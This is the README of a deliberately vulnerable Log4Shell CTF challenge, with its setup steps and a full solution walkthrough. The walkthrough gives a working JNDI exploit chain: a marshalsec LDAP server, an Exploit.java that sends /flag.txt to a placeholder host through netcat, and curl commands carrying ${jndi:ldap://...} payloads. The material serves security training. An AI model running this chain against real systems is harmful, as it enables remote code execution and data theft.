# Escape The Matrix - CTF Challenge

## 🎯 Overview
A web exploitation challenge combining sequential UI puzzle-solving with a hidden Log4Shell (CVE-2021-44228) RCE vulnerability. Navigate through the Matrix, collect fragments, and exploit the void.

## 📋 Challenge Description
**Category:** Web Exploitation  
**Difficulty:** Medium-Hard  
**Points:** 300

Players navigate a Matrix-themed sequential puzzle UI, collecting base64 fragments from HTTP headers. After completing the sequence, they must discover and exploit a hidden Log4j RCE endpoint to capture the final flag.

---

## 🏗️ Architecture

### Tech Stack
- **Frontend:** React 19 + Vite 6.0
- **Backend:** Spring Boot 2.5.6 (Java 8)
- **Vulnerability:** Log4j 2.14.1 (CVE-2021-44228)
- **Deployment:** Docker (multi-stage build)

### Key Components
```
Frontend (Port 5173) → Backend (Port 8080) → GIF Assets
                ↓
        Base64 Fragments in Headers
                ↓
        Hidden RCE Endpoint Discovery
```

---

## 🚀 Quick Start

### Prerequisites
- **Docker** (for deployment)
- **Java 8 + Maven** (for local development)
- **Node.js 18+** (for frontend development)
- **For Exploitation:** marshalsec, netcat, Python 3

### Build & Run with Docker
```bash
# Build the Docker image
docker build -t escape-the-matrix .

# Run the container
docker run -p 8080:8080 escape-the-matrix

# Access the challenge
open http://localhost:8080
```

### Local Development (Without Docker)

**Terminal 1 - Backend:**
```bash
cd server
./mvnw spring-boot:run
# Runs on http://localhost:8080
```

**Terminal 2 - Frontend:**
```bash
cd frontend
npm install
npm run dev
# Runs on http://localhost:5173
```

---

## 🎮 Player Journey

### Phase 1: Sequential Puzzle (Web UI)
1. Access the web interface at `http://localhost:8080`
2. Click "Next Matrix" to navigate through 13 sequential GIF puzzles
3. Each request includes a **30-second cooldown**
4. Collect base64 fragments from the `X-Matrix-Id` response header
5. Decode all 13 fragments to reveal the hidden endpoint

**Key Endpoint:**
```http
GET /api/escape?step={0-12}&sessionId={uuid}
```

**Response Headers:**
```http
X-Matrix-Id: {base64_fragment}
X-Cooldown-Remaining: 30
```

**Session Rules:**
- Each `sessionId` must wait 30 seconds between requests
- Must complete all 13 steps (0-12) sequentially
- Frontend automatically generates unique session IDs

### Phase 2: Exploitation (Log4Shell RCE)
After decoding all fragments, you'll discover:

**Hidden Endpoint:**
```http
POST /api/m4tr1x_Esc4p3d/enT3r_th3_v0iD
Content-Type: application/json

{
  "v0id": "your_payload_here"
}
```

**Vulnerable Parameter:** Only the `v0id` field is vulnerable to Log4j JNDI injection.

---

## 🔍 Solution Walkthrough

### Step 1: Automated Fragment Collection
Use the web UI or script to collect all fragments:

**Python Script:**
```python
#!/usr/bin/env python3
import requests
import base64
import uuid
import time

session_id = str(uuid.uuid4())
fragments = []
base_url = "http://localhost:8080"

print("[*] Starting fragment collection...")
for step in range(13):
    print(f"[+] Collecting fragment {step + 1}/13...")
    
    r = requests.get(
        f"{base_url}/api/escape",
        params={"step": step, "sessionId": session_id}
    )
    
    fragment = r.headers.get('X-Matrix-Id')
    if fragment:
        fragments.append(fragment)
        print(f"    Fragment: {fragment[:20]}...")
    else:
        print(f"    ERROR: No fragment in response!")
    
    if step < 12:  # Don't wait after last fragment
        print("    Waiting 31 seconds for cooldown...")
        time.sleep(31)

# Decode the full message
full_b64 = ''.join(fragments)
decoded = base64.b64decode(full_b64).decode('utf-8')

print("\n[*] Decoded message:")
print(decoded)
```

**Expected Output:**
```
Hidden endpoint discovered: /api/m4tr1x_Esc4p3d/enT3r_th3_v0iD
Parameter: v0id
```

### Step 2: Log4j Exploitation

#### 2.1 Setup LDAP Server (marshalsec)
```bash
# Download marshalsec
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests

# Start LDAP referral server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://YOUR_IP:8000/#Exploit"
```

#### 2.2 Create Malicious Payload
**File: `Exploit.java`**
```java
public class Exploit {
    static {
        try {
            // Read flag and exfiltrate via netcat
            String[] cmd = {
                "/bin/sh",
                "-c",
                "cat /flag.txt | nc YOUR_IP 4444"
            };
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

**Compile with Java 8:**
```bash
javac Exploit.java
```

#### 2.3 Host the Exploit
```bash
# Start HTTP server to serve Exploit.class
python3 -m http.server 8000
```

#### 2.4 Setup Listener
```bash
# Listen for exfiltrated flag
nc -lvnp 4444
```

#### 2.5 Trigger the Exploit
```bash
curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
  -H "Content-Type: application/json" \
  -d '{"v0id": "${jndi:ldap://YOUR_IP:1389/Exploit}"}'
```

**Expected Flow:**
1. Backend logs the `v0id` parameter via Log4j
2. Log4j parses `${jndi:ldap://...}` and connects to your LDAP server
3. LDAP server redirects to HTTP server for `Exploit.class`
4. Java deserializes and executes `Exploit` static block
5. Flag is sent to your netcat listener

---

## 🐳 Docker Networking for Exploitation

When running the challenge in Docker and exploiting from the host:

### Option 1: Use `host.docker.internal` (macOS/Windows)
```bash
curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
  -H "Content-Type: application/json" \
  -d '{"v0id": "${jndi:ldap://host.docker.internal:1389/Exploit}"}'
```

### Option 2: Host Network Mode (Linux)
```bash
# Run container in host network mode
docker run --network=host escape-the-matrix

# Exploit using localhost
curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
  -H "Content-Type: application/json" \
  -d '{"v0id": "${jndi:ldap://127.0.0.1:1389/Exploit}"}'
```

### Option 3: Bridge Network with Host IP (All Platforms)
```bash
# Find Docker bridge IP
ip addr show docker0  # Usually 172.17.0.1

# Use host IP in payload
curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
  -H "Content-Type: application/json" \
  -d '{"v0id": "${jndi:ldap://172.17.0.1:1389/Exploit}"}'
```

### Option 4: Remote VPS (Recommended for CTF)
```bash
# Deploy LDAP + HTTP servers on a public VPS
# Use public IP in JNDI string
curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
  -H "Content-Type: application/json" \
  -d '{"v0id": "${jndi:ldap://YOUR_VPS_IP:1389/Exploit}"}'
```

---

## 📁 Project Structure

```
/
├── Dockerfile                  # Multi-stage Docker build
├── flag.txt                    # The final flag
├── README.md                   # This file
│
├── frontend/                   # React + Vite SPA
│   ├── package.json           # Dependencies (React 19, Vite 6)
│   ├── vite.config.js         # Proxy to backend
│   ├── index.html
│   └── src/
│       ├── main.jsx           # Entry point
│       ├── App.jsx            # Main app component
│       ├── App.css            # Matrix-themed styling
│       └── components/
│           └── MatrixCard.jsx # GIF display + fragment collection
│
├── server/                     # Spring Boot backend
│   ├── pom.xml                # Log4j 2.14.1 dependency
│   ├── mvnw                   # Maven wrapper
│   ├── run-app.sh
│   ├── assets/                # 13 Matrix-themed GIFs
│   │   ├── 0x7e4c91fa.gif
│   │   ├── 4f9e7c2a1d.gif
│   │   └── ... (11 more)
│   └── src/
│       ├── main/
│       │   ├── java/com/example/ctf/
│       │   │   ├── EscapeTheMatrix.java         # Main application
│       │   │   ├── Config/
│       │   │   │   ├── CorsConfig.java          # CORS settings
│       │   │   │   └── StaticConfig.java        # Asset protection
│       │   │   └── Controllers/
│       │   │       └── MatrixController.java    # API endpoints
│       │   └── resources/
│       │       ├── application.properties
│       │       └── log4j2.xml                   # Log4j config
│       └── test/
│           └── java/com/example/ctf/
│               ├── CtfApplicationTests.java
│               └── MatrixControllerTest.java
│
└── test/                       # Exploitation artifacts
    ├── Exploit.java            # Sample payload
    └── solr-log4j/            # Log examples
```

---

## 🔐 Security Implementation Details

### What's Vulnerable
- **Log4j 2.14.1** in `pom.xml` (CVE-2021-44228)
- **Only** the `v0id` parameter in `/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD`
- JNDI lookup enabled in `log4j2.xml`

### What's Protected
- Direct GIF asset access blocked by `StaticConfig.java`
- Other API endpoints (`/api/escape`) are **NOT** vulnerable
- Session-based cooldown prevents brute-force fragment collection
- CORS configured for localhost development

### Intentional Design
```java
// Only this line is vulnerable:
logger.info("Entering the void with: {}", request.getV0id());

// These are safe:
logger.info("Matrix escape attempt at step: {}", step);
logger.info("Session {} is still in cooldown", sessionId);
```

---

## 🛠️ Development & Testing

### Run Backend Tests
```bash
cd server
./mvnw test

# Expected output:
# Tests run: 4, Failures: 0, Errors: 0, Skipped: 0
```

### Run Frontend Tests
```bash
cd frontend
npm test

# Tests MatrixCard component rendering
```

### Manual Testing
```bash
# Test sequential endpoint
curl "http://localhost:8080/api/escape?step=0&sessionId=$(uuidgen)" -v

# Check for X-Matrix-Id header
# Try immediate second request (should get 429 Too Many Requests)

# Test hidden endpoint
curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
  -H "Content-Type: application/json" \
  -d '{"v0id": "test"}' -v
```

### Verify Log4j Logging
```bash
# Check server logs for JNDI lookup attempts
docker logs <container_id> 2>&1 | grep -i jndi
```

---

## 🎓 Learning Objectives

### Technical Skills
- ✅ **HTTP Header Analysis:** Extract data from custom headers
- ✅ **Base64 Encoding:** Decode fragmented messages
- ✅ **API Reconnaissance:** Discover hidden endpoints
- ✅ **Log4Shell Exploitation:** Understand CVE-2021-44228
- ✅ **JNDI Injection:** Master Java deserialization attacks
- ✅ **Docker Networking:** Navigate container-to-host communication
- ✅ **Reverse Shells:** Establish command & control channels

### CTF Concepts
- Sequential challenges with rate limiting
- Multi-phase exploitation (recon → exploit)
- Header-based information leakage
- Real-world vulnerability (Log4Shell)

---

## 🚨 For CTF Organizers

### Deployment Checklist
- [ ] Change `flag.txt` to your custom flag
- [ ] Deploy on isolated network (no production access)
- [ ] Monitor logs for exploitation attempts
- [ ] Consider adding firewall rules for LDAP egress
- [ ] Set up backup server if high traffic expected
- [ ] Document intended solution for judges

### Security Considerations
⚠️ **WARNING:** This application is intentionally vulnerable!

- **Do NOT** deploy on public networks without isolation
- **Do NOT** connect to production databases
- **Monitor** for unintended exploitation vectors
- **Rate limit** at infrastructure level if needed
- **Log** all exploitation attempts for learning

### Scoring Suggestions
- **100 points:** Discover hidden endpoint
- **100 points:** Successfully trigger JNDI lookup
- **100 points:** Retrieve the flag via RCE

---

## 📚 References & Resources

### CVE-2021-44228 (Log4Shell)
- [NIST CVE Details](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [Cloudflare: Inside the Log4j2 Vulnerability](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)

### Exploitation Tools
- [marshalsec](https://github.com/mbechler/marshalsec) - JNDI Exploit Kit
- [ysoserial](https://github.com/frohoff/ysoserial) - Java Deserialization Payloads
- [log4shell-tools](https://github.com/fullhunt/log4j-scan) - Scanning & Detection

### Learning Resources
- [PortSwigger: Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [HackTricks: Log4Shell](https://book.hacktricks.xyz/pentesting-web/deserialization/java-log4j-log4shell)
- [OWASP: Injection Flaws](https://owasp.org/www-project-top-ten/)

---

## 🐛 Troubleshooting

### Issue: "No fragments in response"
**Solution:** Ensure backend is running and CORS is configured correctly.

### Issue: "429 Too Many Requests"
**Solution:** Wait 30 seconds between requests or use a new `sessionId`.

### Issue: "JNDI lookup not working in Docker"
**Solution:** See [Docker Networking](#-docker-networking-for-exploitation) section.

### Issue: "Exploit.class not found"
**Solution:** Ensure Java 8 compilation and HTTP server is serving the correct directory.

### Issue: "Flag not received"
**Solution:** Check netcat listener, verify `/flag.txt` exists in container, check firewall rules.

---

## 📜 License
MIT License - **For educational and CTF purposes only.**

**Disclaimer:** This software contains intentional security vulnerabilities. Use only in controlled, isolated environments for authorized security training and CTF events.

---

## 🙏 Credits & Acknowledgments
- **Vulnerability:** CVE-2021-44228 (Log4Shell) discovered by Chen Zhaojun of Alibaba Cloud Security Team
- **Theme:** Inspired by *The Matrix* franchise
- **Framework:** Spring Boot, React, Vite
- **Built for:** NorthSec CTF 2024
- **Author:** [Your Name/Team]
- **Version:** 1.0.0

---

**🚩 Flag Format:** `flag{...}`  
**💬 Questions?** Check `server/CTF-CHALLENGE-GUIDE.md` for detailed setup instructions.

**Good luck, and remember: there is no spoon. 🥄**
